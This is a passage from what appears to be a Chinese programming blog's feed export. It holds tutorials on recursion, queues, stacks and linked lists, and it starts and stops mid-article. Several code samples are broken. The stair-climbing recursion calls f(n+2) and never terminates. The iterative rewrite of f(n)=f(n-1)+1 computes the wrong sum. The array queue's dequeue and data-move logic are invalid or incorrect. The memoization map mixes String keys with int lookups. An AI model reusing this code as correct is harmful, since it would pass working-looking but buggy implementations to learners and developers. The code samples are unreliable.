n=2时，f(2)=f(1)+f(0),已知的终止条件为f(1)=1,所以f(2)就无法求解了，所以除了f(1)=1这个终止条件之外，我们还需要f(0)=1，表示0个台阶有一种走法，不过这样就不符合正常逻辑了。所以我们可以把f(2)作为一个终止条件，表示走2个台阶，有两种走法（一步走完或者分两步走）。 所以最终的终止条件就是f(1)=1,f(2)=2。这个时候，可以拿n=3，n=4来验证一下，这个终止条件是否足够或者正确。 我们把刚刚的递推公式和终止条件放到一起就是最终的递推公式：$$ f(n) = f(n-1) + f(n-2); \ 其中 \ f(1)=1, f(2)=2; $$ 有了上面的递推公式，转化成代码就简单多了，最终的递归代码如下：12345int f(int n) &#123; if(n==1) return 1; if(n==2) return 2; return f(n-1)+f(n+2);&#125; 总结一下，写递归代码的关键就是要找到如何将大问题分解为小问题的规律，并且基于此写出递推公式，然后在推敲递推终止条件，最后再将递推公式转化为递归代码。 讲了这么多方法，是不是你现在还是有种想不太清楚的地方呢？实际上，这也是文章开头我说递归代码比较难理解的地方。 上面举的电影院的例子，我们的递归调用只有一个分支，也就是说“一个问题只需要分解为一个子问题”，我们可以很容易的想清楚“递”和“归”的每一个步骤，说以写起来、理解起来都不难。 但是，当我们面对的是一个问题分解为多个子问题的情况时，递归代码就没那么好理解了。 像刚刚讲的第二个爬台阶的例子，人脑几乎没办法把整个”递”和”归”的过程一步一步都想清楚。 计算机擅长做重复的事，所以递归正和它的胃口。而我们人脑更喜欢平铺直述的思维方式，当我们看到递归时，我们总想把递归平铺展开，脑子里就会循环，一层一层往下调，然后在一层一层返回，试图搞清楚计算机每一步是怎样执行的，这样就会很容易绕进去。 对于递归代码，这种试图想清楚整个递和归过程的做法，实际上是进入了一个思维误区。很多时候，我们理解起来比较吃力，主要原因就是自己给自己制造了这种理解障碍。那正确的思维方式应该是怎样的呢？ 如果一个问题A可以分解为若干子问题B、C、D，你可以假设子问题B、C、D已经解决，在此基础上思考和解决问题A，而且，你只需要思考问题A和子问题B、C、D两层之间的关系即可，不需要一层一层往下思考子问题与子子问题，子子问题与子子子问题之间的关系。屏蔽掉递归细节，这样子理解起来就简单多了。 因此，编写递归代码的关键是，只要遇到递归，我么就把它抽象成一个递推公式，不用想一层层的调用关系，不要试图用人脑去分解递归的每个步骤 递归代码警惕堆栈溢出 在实际的软件开发中，编写递归代码时，我们会遇到很多问题，比如堆栈溢出，而堆栈溢出会造成系统性崩溃，后果会非常严重。为什么递归代码容易造成堆栈溢出呢？我们又如何预防堆栈溢出呢？ 在”栈”那一节讲过，函数调用会使用栈来保存临时变量。每调用一个函数，都会将临时变量封装为栈帧压入内存栈，等函数执行完返回时，才出栈。系统栈或虚拟机栈一般都不会很大，如果递归求解的数据规模很大，调用层次很深，一直压入栈，就会有堆栈溢出的风险。 比如上面求解的电影院的例子，如果我们将系统栈或者虚拟机栈的大小设置为1KB，在求解f(19999)时就会出现如下堆栈错误：1Exception in thread "main" java.lang.StackOverflowError 那么如何避免堆栈溢出呢？ 我们可以通过在代码中限制递归调用的最大深度的方式来解决这个问题。递归调用超过一定深度（比如1000）之后，我么就不在继续往下递归了，直接返回报错。还是电影院那个例子，我们可以改造成下面这个样子，就可以避免堆栈溢出了。不过，我这写的是些伪代码，为了代码的简洁，有些边界条件没有考虑，比如n&lt;=0。 123456789// 表示递归的深度int depth = 0;int f(int n)&#123; ++depth; if(depth&gt;1000)throw exception; if(n==1) return 1; return f(n-1)+1;&#125; 但这种做法并不能完全解决问题，因为最大允许的递归深度跟当前线程剩余的栈空间大小有关，事先无法计算。如果实时计算，代码过于复杂，就会影响了代码的可读性。所以，如果最大深度比较小，比如10、50，就可以用这种方法，否则这种方法并不是很实用。 递归代码警惕重复计算 除此之外，使用递归时还会出现重复计算的问题，将刚才讲的第二个递归代码的例子，如果我们把整个递归过程分解一下的话，那就是这样的： 从图中，我们可以直观的看到，想要计算f(5)，需要先计算f(4)、f(3)，而计算f(4)还需要计算f(3)，因此f(3)就被计算了很多次，这就是重复计算问题。 为了避免重复计算问题，我们可以用一个数据结构（比如散列表）来保存已经求解过的f(n)。当递归调用到f(n)时，先看下是否已经求解过了。如果是则直接从散列表中取值返回，不需要重复计算，这样就能避免刚才讲的重复计算了。 按照上面的思路，我们再来改造一下代码：1234567891011Map&lt;String, Integer&gt; map = new Hashmap&lt;&gt;();public static int f(int n)&#123; if(n==1) return 1; if(n==2) return 2; if(map.containsKey(n))&#123; return map.get(n); &#125; int ret = f(n-1) + f(n-2); map.put(n, ret); return ret;&#125; 除了堆栈溢出、重复计算这两个常见的问题，递归代码还有其他很多别的问题。 在时间效率上，递归代码里多了很多函数调用，当这些函数调用的数量较大时，就会积累成一个可观的时间成本。在空间复杂度上，因为递归调用一次就会在内存栈上保存一次现场数据，所以进行递归代码的空间复杂度分析时，需要考虑这部分的开销。比如电影院的的例子中，空间复杂度并不是O(1)，而是O(n)。 怎样将递归代码改写为非递归代码 我们刚讲了，递归有利有弊，利是递归代码的表达力很强，写起来非常简洁；而弊是空间复杂度高，有堆栈溢出的风险，存在重复计算的问题，过多的函数调用会导致耗时较多等问题。所以在实际开发中，我们需要根据实际情况来选择是否需要用递归的方式来实现。 那我们是否可以将递归代码改写为非递归代码呢？ 仍以刚才的电影院的例子，我们抛开场景，只看f(n) = f(n-1)+1 这个递推公式。我们可以这样改改看看：1234567int f(int n)&#123; int ret = 1; for(int i=2; i&lt;=n; ++i)&#123; ret = ret+i; &#125; return ret;&#125; 同样，第二个例子也可以改写为非递归的方式实现。 1234567891011121314int f(int n)&#123; if(n==1)return 1; if(n==2)return 2; int ret = 0; int prepre = 1; // f(1)=1 int pre = 2; // f(2)=2 for(int i=3;i&lt;=n;++i)&#123; //f(3) = f(2)+f(1) ret = pre + prepre; prepre = pre; pre = ret; &#125; return ret;&#125; 那是不是所有的递归代码都可以改写为这种迭代循环的非递归写法呢？ 笼统的讲，是的。因为递归本身就是借助栈来实现的，只不过我们使用的栈是系统或者虚拟机本身提供的，我们没有感知罢了。如果我们自己在内存堆上实现栈，手动模拟入栈、出栈过程，这样任何递归代码都可以改写成看上去不是递归代码的样子。 但是这种思路实现上是将递归改为了“手动”递归，本质并没有变，而且也没有解决前面讲到的基础问题，徒增了实现的复杂度。 解答开篇 到此为止，递归相关的知识也讲完了，我们来看一下开篇的问题：如何找到“最终推荐人”？我们的解决方案是这样的： 12345long findRootRefererId(long actorId)&#123; long refererId = select referer_id from [table] where actor_id = actorId; if(refererId == null) return actorId; return findRootRefererId(refererId)&#125; 是不是非常简洁，用三行代码就搞定了，不过在实际项目中，上面的代码并不能工作，为什么呢？这里有两个问题。 第一，如果递归很深，可能会有堆栈溢出问题。 第二，如果数据库存在脏数据，我们还需要处理由此产生的无限循环递归的问题。比如demo环境下数据库中，测试工程师为了方便测试，会认为的插入一些数据，就会出现脏数据，如果A的推荐人是B，B的推荐人是C，C的推荐人是A，这样就会发生死循环。 内容小结 递归是一种非常高效、简洁的编码技巧，只要满足“三个条件”的问题都可以通过递归代码来解决。 不过递归代码也比较难写、难理解。编写递归代码的关键就是不要把自己绕进去，正确姿势是写出递推公式，找到终止条件，然后再翻译成递归代码。 递归代码虽然简洁高效，但是递归代码也有很多弊端。比如，堆栈溢出、重复计算、函数调用耗时多、空间复杂度高等，所以，在编写递归代码时，一定要控制好这些副作用。 思考题1、 递归代码的时间复杂度该如何分析？ 2、 递归代码如何调试呢？你有什么好的调试方法吗？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>递归</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-队列]]></title>
    <url>%2Fposts%2F2018-09-16-%E7%AE%97%E6%B3%95-%E9%98%9F%E5%88%97.html</url>
    <content type="text"><![CDATA[前言 我们知道，CPU资源是有限的，任务的处理逻辑与线程个数并不是正相关。相反，过多的线程反而会导致CPU频繁切换，处理性能下降。所以，线程池的大小一般都是综合考虑要处理任务的特点与硬件环境，来事先设置的。 当我们向一个固定大小的线程池中请求一个线程时，如果线程池中没有空闲资源了，这个时候线程池如何处理这个请求？是拒绝请求还是排队请求？各种处理策略又是如何实现的？ 其实，这些问题并不复杂，其底层的数据结构就是今天的内容，队列(queue)。 如何理解队列 队列这个概念非常好理解，你可以把它想象成排队买票，先来的先买，后来的人只能站末尾，不允许插队。先进者先出，这就是典型的队列。 我们知道，栈只支持两个操作：入栈push()和出栈pop()，队列和栈非常类似，支持的操作只有：入队enqueue()，将一个数据放入队尾，出队dequeue()，从队头取出一个数据。 所以，队列跟栈一样，也是一种操作受限的线性表数据结构。 队列的概念很好理解，基本操作也很容易掌握。作为一种非常基础的数据结构，队列的应用也非常广泛。特别是一些具有额外特性的队列，比如循环队列、阻塞队列、并发队列。它们在很多片底层系统、框架、中间件的开发中，起着关键性的作用。比如高性能队列Disruptor、Linux环形存储，都用到了循环队列；java.concurent并发包中用到了ArrayBlockingQueue来实现公平锁等。 顺序队列和链式队列 我们知道了，队列跟栈一样，也是一种抽象的数据结构。它具有先进先出的特性，支持在队尾插入元素，在对头删除元素，那么究竟该如何实现一个队列呢？ 跟栈一样，队列可以用数组实现，也可以用链表实现。用数组实现的栈叫做顺序栈，用链表实现的栈叫做链式栈。同样，用数组实现的队列叫做顺序队列，用链表实现的队列叫做链式队列。 先来看下基于数组的实现方法。我这里采用java语言进行实现，不会涉及高级语法。 12345678910111213141516171819202122232425262728293031323334353637// 基于数组实现的队列public class ArrayQueue&lt;T&gt;&#123; // 数组items private T[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public ArrayQueue()&#123; this(10); // 队列默认容量给10 &#125; public ArrayQueue(int capacity)&#123; this.items = new T[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 items[tail] = val; size ++; tail ++; return true; &#125; public T dequeue()&#123; if (size == 0) &#123; return; &#125; T res = items[head]; head++; size--; return res; &#125;&#125; 比起栈的数组实现，队列的数组实现稍微有点复杂。 对于栈来说，我们只需要一个栈顶指针就可以了，但是队列需要两个指针：一个head指针，指向队头；一个tail指针，指向队尾。 你可以结合下面这幅图来理解。当a、b、c、d…依次入队之后，指针中的head指针指向下标为1的位置，tail指针指向下标为7的位置。 当我们调用两次出队操作之后，队列中的head指针指向下标为5的位置，tail仍然指向下标为7的位置。 你肯定已经发现了，随着不停的入队、出队操作，head、tail都会持续往后移动。当tail移动到最右边，即使数组中还有空闲空间，也无法继续往队列中添加数据了。这个问题如何解决呢？ 在数组那一节中，我们遇到过同样的问题，数组的删除操作会导致数组中的数据不连续，还记得我们怎么解决得吗？数据搬移！，但是每次出队时都相当于删除数组下标为0的数据，要搬移整个队列中的数据，这样队列的出队时间复杂度就从原来的O(1)变为了O(n)，能不能优化呢？ 实际上，我们在出队时可以不用搬移数据，如果没有空闲空间了，我们只需要在入队时，在集中触发一次数据的搬移操作。借助这个思想，出队函数保持不变，我们稍加改造一下入队函数enqueue()实现，就可以轻松解决刚才的问题了。 12345678910111213141516public boolean enqueue(T val)&#123; if(size == capacity)&#123;return false;&#125; // 队列满了 // tail到尾部，队列没有满 if (tail == capactity &amp;&amp; size&lt;capacity) &#123; // 数据搬移 for (int i=head;i&lt;tail;i++) &#123; // 将head到tail的数据搬移到0到size的位置 items[i-head] = items[i] &#125; &#125; items[tail] = val; size ++ ; tail ++; return true;&#125; 从代码中我们可以看到，当队列tail指针移动到数组的最右边后，且数组没有满时，如果有新的数据入队，我们可以将head-tail之间的数据，整体搬移到0-size之间的位置， 这种思路中，出队的时间复杂度仍然是O(1)，但是入队的时间复杂度还是O(n)吗？此处用以前讲过的摊还分析法自行分析一下。 接下来，我们看看基于链表的队列的实现方法。 基于链表的实现，我们同样需要两个指针：head指针和tail指针。他们分别指向第一个结点和最后一个结点。入队时，tail-&gt;next = newNode, tail = tail-&gt;next;出队时，head = head-&gt;next。 我将具体代码放到我的github上，有需要的可以看看。 循环队列 我们上面用数组实现的队列，在tail=capacity的时候，会有数据搬移操作，这样入队操作性能就会受到影响。那有没有办法能够避免数据搬移操作呢？我们来看看循环队列的解决思路。 循环队列，顾名思义，它长得像一个环。原本数组是有头有尾的，是一条直线，我们现在把首尾相连，掰成了一个环，可以通过下图直观感受一下。 我们可以看到，图中这个队列的大小为8，当前head=0，tail=3.当有一个新的元素d入队时，我们放入到下标为3的位置，并将tail指向4。当tail指向7，这时候再有新的元素入队时，我们并不将tail更新为8，而是将tail指向0，如果再有元素入队，放入下标为0处的位置，并将tail更新为1。当然如果head=0处没有出队的话，就说明队列满了。 通过这样的方法，我们成功的避免了数据搬移操作，看起来不难理解，但是循环队列的代码实现难度要比前面讲的非循环队列难多了。要想写出没有bug的循环队列的实现代码，最关键的是，确定队列空和队列满的判定条件。 在用数组实现的队列中，对空的判定条件是head==tail，队列满的条件是tail==capacity。那针对循环队列，如何判断队满和队空呢？ 队列为空的条件仍然是head==tail，但是队列满了的判断条件就复杂了，我画了如下一张队列满的图，可以看一下队满的规律。 图中队列满时，tail=3，head=4，size=8，capacity=8，多画几张队满的图，就会发现队满时（tail+1）%capacity = head。同时，head和tail不能简单的使用++或者–，得出规律tail=(tail+1)%capacity，head=(head+1)%capacity。 下面看下一下循环队列的代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 基于数组实现的循环队列public class CircularQueue&lt;T&gt; implements Queue&lt;T&gt; &#123; // 数组items private Object[] items; // 队列大小 private int size=0; private int capacity; // head表示队头下标，tail表示队尾下标 private int head=0; private int tail=0; public CircularQueue()&#123; this(10); // 队列默认容量给10 &#125; public CircularQueue(int capacity)&#123; this.items = new Object[capacity]; this.capacity = capacity; &#125; public boolean enqueue(T val)&#123; if ((tail+1)%capacity == head)&#123; throw new RuntimeException("循环队列满了！"); &#125; items[tail] = val; tail = (tail+1)%capacity; size ++; return true; &#125; public T dequeue()&#123; if (size&lt;=0)&#123; throw new RuntimeException("空队列！"); &#125; T res = (T) items[head]; size--; head = (head+1)%capacity; return res; &#125; @Override public String toString() &#123; return Arrays.toString(items); &#125; @Override public int size() &#123; return size; &#125;&#125; 阻塞队列和并发队列 上面讲的都是些理论知识，看起来很难跟实际项目扯上关系，确实，队列这种数据结构很基础，平时的业务开发不大可能从零开始实现一个队列，甚至都不会直接用到。而一些具有特殊特性的队列应用却比较广泛，如阻塞队列和并发队列。 阻塞队列其实就是在队列基础上增加了阻塞操作。简单来说，就是在队列为空的时候，从对头取数据会被阻塞。并未此时还没有数据可取，直到队列中有了数据才能返回；如果队列已经满了，那么插入数据的操作就会被阻塞，直到队列中有空闲位置后在插入数据，然后在返回。 你应该已经发现了，上述的定义就是一个”生产者-消费者模型”！是的，我们可以用阻塞队列轻松实现一个”生产者-消费者模型”。 这种基于阻塞队列实现的”生产者-消费者模型”可以有效的协调生产和消费的速度。当”生产者”生产数据的速度过快，”消费者”来不及消费时，存储数据的队列很快就会满了，这个时候，生产者就阻塞等待，直到”消费者”消费了数据，”生产者”才会被唤醒继续生产。 而且不仅如此，基于阻塞队列，我们可以通过协调”生产者”和”消费者”的个数，来提高数据处理的效率。比如前面的例子，我们可以配备多个”消费者”，来对应一个”生产者”。 前面讲了阻塞队列，在多线程情况下，会有多个线程同时操作队列，这个时候就会存在线程安全问题，那如何实现一个线程安全的队列呢？ 线程安全的队列我们叫做并发队列。最简单直接的实现方式是直接在enqueue()、dequeue()上加锁，但是这样锁粒度大并发较低，同一时刻仅允许一个村或者取操作。实际上，基于数组的循环队列，利用CAS原子操作，可以实现非常高效的并发队列。这也是循环队列比链式队列应用更加广泛的原因。 解答开篇 队列的知识讲完了，我们来看一下开篇的问题。线程池没有空闲线程时，新的任务请求线程资源时，线程池该如何处理，各种处理策略又是如何实现的呢？ 我们一般有两种处理策略。第一种是非阻塞的处理方式，直接拒绝任务请求；另一种是阻塞的处理方式，将请求进行排队，等到有空闲线程时，取出队列中的请求继续处理。那如何存储排队的请求呢？ 我们希望公平的处理每个排队的请求，先进者先出，所以队列这种数据结构很适合存储排队请求。我们前面说过，队列有基于链表和基于数组这两种方式，那这两种实现方式对于排队请求又有什么区别呢？ 基于链表实现的方式，可以实现一个支持无限排队的无界队列，但是可能会导致过多的请求排队等待，请求处理的响应时间过长。所以，针对响应时间较敏感的系统，基于链表实现的无限排队的线程池是不合适的。 而基于数组实现的有界队列，队列的大小有限，所以线程池中排队的请求超过队列大小时，接下来的请求就会被拒绝，这种方式对响应时间敏感的系统，就相对来说比较合理。不过设置一个合适的队列大小，也是非常有讲究的。队列太大导致等待的请求太多，队列太小会导致无法充分利用系统资源，发挥最大性能。 除了前面讲到的应用在线程池请求排队的场景之外，队列还可以应用在任何有限资源池中，用于排队请求，比如数据库连接池。实际上，对于大部分资源有限的场景，当没有空闲资源时，基本上都可以通过队列这种数据结构来实现队列请求排队。 内容小结 今天我们讲了一种跟栈很相似的数据结构，队列。 队列最大的特点就是先进先出，主要的两个操作是入队和出队。跟栈一样，它既可以用数组来实现，也可以用链表来实现。用数组实现的叫顺序队列，用链表实现的叫链式队列。特别是一个长得像环一样的叫循环队列。在用数组实现的队列时，会有数据搬移的工作，要想解决数据搬移的工作，我们就需要像环一样的循环队列。 循环队列是这篇的重点，要想写出没有bug的循环队列的实现代码，关键是要确定队满和队空的判定条件。 除此之外，还有几种高级的数据结构，阻塞队列、并发队列，但是底层都是队列这种数据结构，只不过附加了其他的一些功能。阻塞队列就是可以对出队、入队操作进行阻塞，并发队列就是保证了多线程的队列操作线程安全。 课后思考 1、 除了线程池这种池结构会用到队列排队请求，你还知道那些类似的数据结构或者场景会用到队列的排队请求。 如数据库的连接池、分布式应用中的消息队列（kafka、MQ） 2、 关于并发队列，如何实现无锁的并发队列。 提示： CAS(compare and swap) 乐观锁 悲观锁 (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>队列</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-栈]]></title>
    <url>%2Fposts%2F2018-09-15-%E7%AE%97%E6%B3%95-%E6%A0%88.html</url>
    <content type="text"><![CDATA[前言 浏览器的前进、后退功能，我想你肯定很熟悉吧？ 当你依次访问完一连串页面a-b-c-d之后，点击浏览器的后退按钮，就可以查看之前浏览过的页面c-b-a。当后退到a页面之后，点击前进按钮，可以重新进入页面b-c-d。但是如果进入页面b之后，点击了两一个页面，那就无法通过前进后退页面进入c-d了。 假如你是浏览器的开发设计者，你会如何实现这个功能呢？带着这个问题，我们来看一下“栈”这个数据结构。 如何理解栈？ 关于栈，举一个非常贴切的例子。比如叠盘子，我们放盘子的时候都是从下往上一个一个放。取的时候，我们也是从上往下一个一个取，不能从中间抽取。先进者后出，后进者先出，这就是典型的栈结构。 从栈的操作特性上来看，栈是一种操作受限的线性表，只允许在一端插入和删除数据。 我第一次接触这种数据结构的时候，就对它存在的意义产生了很大的疑惑。因为相比数组和链表，栈带给我的只有限制，并没有任何优势。那我直接使用数组或者链表就好了？为什么还要用这个“操作受限”的数据结构呢？ 事实上，从功能上来说，数组和链表确实可以代替栈，但是你要知道，特定的数据结构是对特定场景的抽象，而且数组和链表暴露了太多的操作接口，操作上的确灵活自由，但使用时就比较不可控，自然就更容易出错。 当某个数据集合只涉及在一端插入和删除数据时，并且满足先进后出、后进先出的特性，我们就应该用栈这种数据结构。 如何实现一个栈？ 从刚才栈的定义里可以看出，栈主要包含两个操作，入栈和出栈。也就是在在栈顶插入一个数据和从栈顶删除一个数据。理解了栈的定义之后，我们来看一看如何用代码实现一个栈。 实际上，栈可以用数组来实现，也可以用链表来实现。用数组实现的栈，我们叫做顺序栈，用链表实现的栈，我们叫做链式栈。 基于数组实现的顺序栈我这里用Java实现一个基于数组的顺序栈，基于链表的实现，可以自己写一下。 12345678910111213141516171819202122232425262728293031323334353637383940// 基于数组实现的链式栈public class ArrayStack&lt;T&gt; implements stack&lt;T&gt; &#123; private final Object [] DEFAULT_ARRAY = new Object[10]; private final int DEFAULT_CAP = 10; private Object[] data; private int cap; private int size; public ArrayStack() &#123; this.cap = DEFAULT_CAP; this.size = 0; this.data = DEFAULT_ARRAY; &#125; public ArrayStack(int cap)&#123; if (cap &lt; 0) throw new IllegalArgumentException("Illegal Capacity: "+ cap); this.cap = cap; this.data = new Object[cap]; &#125; public void push(T val) &#123; if (size&lt;cap)&#123; // 数组满了 data[size] = val; size++; &#125;else &#123; throw new Runtime("stack is full!") // 可以动态扩容的stack // Object[] objects = new Object[cap*2]; // System.arraycopy(data, 0, objects, 0, size); // data = objects; // data[size] = val; // size ++; &#125; &#125; public T pop() &#123; if (size == 0) return null; T result = (T) data[size-1]; size--; return result; &#125;&#125; 了解了定义和基本操作，那它的操作时间、空间复杂度是多少呢？ 不管是链式栈还是顺序栈，我们存储数据需要一个大小为n的数组就够了。在入栈和出栈的过程中，只需要一两个临时变量存储空间，因此时间复杂度是O(1)。 注意这里存储数据需要一个大小为n的数组，并不是说空间复杂度是O(n)，因为这n个空间是必须的，无法省掉。所以我们说空间复杂度的时候，是指除了原本的数据存储空间外，算法运行还需要额外的存储空间。 时间复杂度分析：不管是入栈、出栈，都只涉及栈顶个别数据的操作，因此时间复杂度为O(1)。 支持动态扩容的顺序栈刚才那个基于数组实现的顺序栈，是一个固定大小的栈，也就是说，在初始化后需要实现指定栈的大小，当栈满之后，就无法在王栈里添加数据了，尽管链式栈的大小不受限，但是要存储next指针，内存消耗相对较多。那我们如何实现一个可以支持动态扩容的栈呢？ 还记得，在数组那一节，要如何来实现一个支持动态扩容的数组吗？当数组空间不足时，我们重新申请一块更大的内存，将原来数组中的数据拷贝过去，这样就实现了一个支持动态扩容的数组。 所以，如果实现一个支持动态扩容的栈，我们只需要底层依赖一个支持动态扩容的数组就可以了。当栈满了之后，我们就申请一个更大的数组，将原来的数据搬移到新的数组中。 实际上，支持动态扩容的顺序栈，我们开发中并不经常用到。这块我们复习一下复杂度分析方法。现在我们来分析一下支持动态扩容的顺序栈的入栈、出栈时间复杂度。 对于出栈操作来说，不会涉及到内存的重新申请和数据搬移，所以出栈的时间复杂度仍然是O(1)。但是对于入栈操作来说，情况就不一样了，当栈中有空闲空间时，入栈操作时间复杂度为O(1)，当栈中没有空间不够时，就需要重新申请内存和数据搬移，所以时间复杂度就变成了O(n)。 也就是说，对于入栈操作来说，最好时间复杂度为O(1)，最坏情况时间复杂度为O(n)。那平均情况下的时间复杂度是多少呢？还记得时间复杂度分析方法中的摊还分析法吗？这个入栈操作的平均情况的时间按复杂度正好可以用摊还分析法来分析。 为了分析方便，我们先做一些假设和定义： 栈空间不够时，我们重新申请一个是原来大小两倍的数组； 为了简化分析，假设只有入栈操作没有出栈操作； 定义不涉及内存搬移操作的入栈操作为simple-push操作，时间复杂度为O(1)。 如果当前栈大小为K，并且已满，当在有新的的数据要入栈时，就需要重新申请2倍大小的内存，并且做K个数据的搬移操作，然后在入栈。但是，接下来的K-1次入栈操作，我们都不需要在重新申请内存和搬移数据，所以这k-1次都只需要一次simple-push操作就可以完成。如下图： 从上图看出，这K次入栈操作，总共涉及了K个数据的搬移，以及K次simple-push操作。讲K个数据搬移均摊到K次入栈操作，那每个入栈操作只需要一个数据搬移和一个simpel-push操作。以此类推，入栈操作的时间复杂度为O(1)。 通过这个例子分析，也验证了前面讲的，均摊时间复杂度一般都等于最好时间复杂度。因为在大部分情况下，入栈操作的时间复杂度都是O(1)，只有在个别情况才会退化为O(n)，所以把耗时多的入栈操作的时间均摊到其他入栈操作上，平均情况下耗时就接近O(1)。 栈的应用场景 栈在函数调用中的应用前面讲的都比较偏理论，我们现在来看，栈在软件工程中的实际应用。栈作为一个比较基础的数据结构，应用场景还是蛮多的。其中比较经典的一个应用场景就是函数调用栈。 我们知道，操作系统给每个线程分配了一块独立的内存空间，这块内存空间被组织成“栈”这种结构，用来存储函数调用时的临时变量。每进入一个函数，就会将临时变量作为一个栈帧入栈，当被调用函数执行完成，返回之后，将这个函数对应的栈帧出栈。为了更好理解函数调用栈，一起来看一下这段代码的执行过程。 123456789101112131415int main()&#123; int a = 1; int ret = 0; int res = 0; ret = add(3,5); res = a + ret; printf("%d", res); return 0;&#125;int add(int x, int y)&#123; int sum = 0; sum = x + y; return sum;&#125; 从代码中我们可以看出，main函数调用了add函数，获取计算结果，并且与临时变量a相加，最后打印res的值，为了清晰的看到这个过程的函数栈里对应的入栈、出栈过程，我这里画了一张函数栈图： 栈在表达式求值中的应用我们再来看一个栈的常见应用场景，编译器如何利用栈实现表达式求值。 这里我们用一个只包含加减乘除四则运算的表达式来解释，比如：34+13*9+44-12/3。对于这个四则运算，我们人脑可以很快算出来，但是对于计算机来说，理解这个表达式本身就是个挺难的事。如果是你，你会怎么实现一个表达式求值的功能呢？ 实际上，编译器就是通过两个栈来实现的。其中一个是保存操作数的栈，另一个保存运算符的栈。我们从左往右遍历表达式，当遇到数字，我们直接压入操作数栈。当遇到运算符，就与运算符的栈顶元素进行比较。如果运算符比当前栈顶元素的优先级高，就直接压入运算符栈中，如果比栈顶元素的优先级低或者相同，就将当前栈顶元素取出，再从操作数栈中取出两个操作数，然后进行运算，再把计算完的结果压入操作数栈，继续比较。 这里用一个简单的例子：3+5*8-6 我将这个表达式的计算过程画成一个图，结合图来理解刚才的计算过程。 栈在括号匹配中的应用出了用栈来实现表达式求值，我们还可以借助栈来检查表达式中的括号是否匹配。 我们同样简化一下背景，假设表达式只包含三种括号，圆括号()、方括号[]、花括号{}，并且他们可以任意嵌套。比如{[{}]}、[([]){()}]等都为合法格式，而{[}()或[{(}]为非法格式。那现在给你一个包含三种括号的表达式字符串，如何检查它是否合法呢？ 这里也可以用栈来解决。我们用栈来保存未匹配的左括号，从做到右一次扫描字符串。当扫描到左括号时，则将其压入栈中，当扫描到右括号时，从栈顶取出一个左括号。如果能够匹配，比如”(“和”)”匹配、”[“和”]”匹配、”{“和”}”匹配，则继续扫描剩下的字符串。如果扫描过程中，遇到不能匹配的右括号，或者栈中没有数据，则说明为非法格式。 当所有的括号都扫描完成后，如果栈为空，则说明字符串为合法格式；否则说明有为匹配的左括号，为非法格式。 解答开篇 好了，理解了栈的概念和应用，再回头看看开篇的问题。如何实现浏览器的前进、后退功能？学过栈之后，就可以用两个栈完美的解决这个问题了。 我们使用两个栈X、Y，把首次浏览的页面压入栈X，当点击后退按钮时，依次从栈X中出栈，并将出栈的数据依次放入栈Y。当我们点击前进按钮时，依次取出栈Y中的数据，并放入栈X。当X中没有数据时，说明没有页面可以后退了。当Y中没有数据时，说明没有页面可以点击前进按钮进行浏览了。 当我们依次浏览了a、b、c三个页面，我们依次把a、b、c压入栈，这个时候，两个栈的数据就是如下这个样子： 当我们通过浏览器的后退按钮，从页面c后退到页面a之后，我们依次把c、b从栈X中弹出，并且依次放入栈Y中，这个时候栈中的数据就是如下： 这时候，又想看页面b，于是点击前进按钮回到b页面，我们就把b再从栈Y中取出，放入X，此时栈中数据如下： 总结 栈是一种操作受限的数据结构，只支持入栈和出栈操作。后进先出是它的最大特点。栈既可以通过数组来实现，也可以通过链表来实现。不管是数组实现的栈，还是链表实现的栈，他们的入栈、出栈时间复杂度都为O(1)。在基于数组实现的动态扩容的顺序栈中，时间复杂度均为O(1)，重点是入栈时间复杂度中关于摊还分析法的掌握。 思考 1、再讲栈的应用时，讲到用函数调用栈来保存临时变量，为什么函数调用要用”栈”这种数据结构来保存临时变量呢？用其他数据结构可以吗？2、我们知道，JVM内存管理中有个“堆栈”的概念。栈内存用来白村局部变量和方法调用，堆内存用来存储java中的对象。那JVM里面的“栈”和我们这里的“栈”一样吗？不一样的话，为什么叫“栈”呢？ (adsbygoogle = window.adsbygoogle || []).push({});]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法-怎样写好链表代码]]></title>
    <url>%2Fposts%2F2018-09-13-%E7%AE%97%E6%B3%95-%E6%80%8E%E6%A0%B7%E5%86%99%E5%A5%BD%E9%93%BE%E8%A1%A8%E4%BB%A3%E7%A0%81.html</url>
    <content type="text"><![CDATA[上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。 为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？ 只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？ 当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。 理解指针或引用的含义事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。 有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。 接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。 实际上，对于指针的理解，只需要记住下面这句话就可以了：将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量。 在编写链表代码的时候，经常会有这样的代码：p-&gt;next = 